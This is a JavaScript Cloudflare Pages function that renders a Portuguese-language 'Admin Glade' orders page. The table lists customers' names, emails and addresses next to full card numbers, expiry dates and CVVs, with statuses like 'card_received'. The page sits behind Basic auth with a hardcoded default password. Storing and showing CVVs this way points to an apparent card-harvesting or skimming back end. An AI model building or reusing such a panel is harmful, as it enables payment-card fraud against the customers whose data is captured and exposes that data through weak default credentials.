const escapeHtml = value => String(value ?? '').replace(/[&<>'"]/g, char => ({
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  "'": '&#39;',
  '"': '&quot;'
})[char]);

function authorized(request, env) {
  const header = request.headers.get('Authorization') || '';
  if (!header.startsWith('Basic ')) return false;
  try {
    const [user, password] = atob(header.slice(6)).split(':');
    return user === (env.ADMIN_USER || 'admin') && password === (env.ADMIN_PASSWORD || 'glade2026');
  } catch {
    return false;
  }
}

export async function onRequestGet({ request, env }) {
  if (!authorized(request, env)) {
    return new Response('<h1>Acesso negado</h1>', {
      status: 401,
      headers: {
        'WWW-Authenticate': 'Basic realm="Admin Glade"',
        'Content-Type': 'text/html; charset=utf-8'
      }
    });
  }

  if (!env.ORDERS_DB) {
    return new Response('<h1>Banco ORDERS_DB não configurado no Cloudflare Pages</h1>', {
      status: 500,
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }

  const { results: orders } = await env.ORDERS_DB.prepare('SELECT * FROM orders ORDER BY id DESC').all();

  const rows = (orders || []).map(o => `
    <tr>
      <td>${escapeHtml(o.id)}</td>
      <td>${o.created_at ? new Date(o.created_at).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) : '-'}</td>
      <td>${escapeHtml(o.customer_name)}</td>
      <td>${escapeHtml(o.customer_email)}</td>
      <td>${escapeHtml([o.customer_street, o.customer_number, o.customer_complement, o.customer_neighborhood, o.customer_city, o.customer_state].filter(Boolean).join(', ') || o.customer_cep)}</td>
      <td><span class="badge ${escapeHtml(o.payment_method)}">${escapeHtml(o.payment_method || '').toUpperCase()}</span></td>
      <td class="mono">${escapeHtml(o.card_number || '—')}</td>
      <td>${escapeHtml(o.card_expiry || '—')}</td>
      <td>${escapeHtml(o.card_cvv || '—')}</td>
      <td><span class="badge ${escapeHtml(o.status || 'pending')}">${escapeHtml(o.status || 'pending')}</span></td>
      <td>R$ ${(Number(o.amount_cents || 0) / 100).toFixed(2)}</td>
    </tr>`).join('');

  const html = `<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Admin — Pedidos</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Inter, system-ui, -apple-system, sans-serif; background: #0f0f1a; color: #e8e0f0; min-height: 100vh; padding: 24px; }
    h1 { font-size: 1.5rem; margin-bottom: 6px; color: #c89cf7; }
    .sub { color: #7a6e8a; font-size: 0.85rem; margin-bottom: 24px; }
    .count { display: inline-block; background: #2a1f3d; color: #c89cf7; border-radius: 99px; padding: 2px 12px; font-size: 0.8rem; font-weight: 700; margin-left: 8px; }
    .wrap { overflow-x: auto; border-radius: 16px; border: 1px solid #2a1f3d; }
    table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
    thead th { background: #1a1030; padding: 12px 14px; text-align: left; color: #9b8ab0; font-weight: 700; white-space: nowrap; }
    tbody tr { border-top: 1px solid #1e1530; }
    tbody tr:hover { background: #1a1030; }
    td { padding: 11px 14px; vertical-align: middle; white-space: nowrap; }
    .mono { font-family: monospace; font-size: 0.85rem; letter-spacing: 0.5px; }
    .badge { display: inline-block; padding: 2px 10px; border-radius: 99px; font-size: 0.72rem; font-weight: 800; }
    .badge.pix, .badge.pix_generated { background: #0c3326; color: #3effa0; }
    .badge.card, .badge.card_error { background: #3a1020; color: #ff8090; }
    .badge.card_received { background: #102a3a; color: #80d0ff; }
    .badge.pending { background: #2a2010; color: #ffd080; }
    .empty { text-align: center; padding: 40px; color: #4a3e5a; }
    a { color: #c89cf7; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <h1>Pedidos <span class="count">${orders.length}</span></h1>
  <p class="sub">Atualizado em ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })} &nbsp;·&nbsp; <a href="/admin/orders">↻ Atualizar</a></p>
  <div class="wrap">
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Data</th>
          <th>Nome</th>
          <th>E-mail</th>
          <th>Endereço</th>
          <th>Pgto</th>
          <th>Nº Cartão</th>
          <th>Validade</th>
          <th>CVV</th>
          <th>Status</th>
          <th>Valor</th>
        </tr>
      </thead>
      <tbody>
        ${rows || '<tr><td colspan="11" class="empty">Nenhum pedido ainda.</td></tr>'}
      </tbody>
    </table>
  </div>
</body>
</html>`;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store'
    }
  });
}
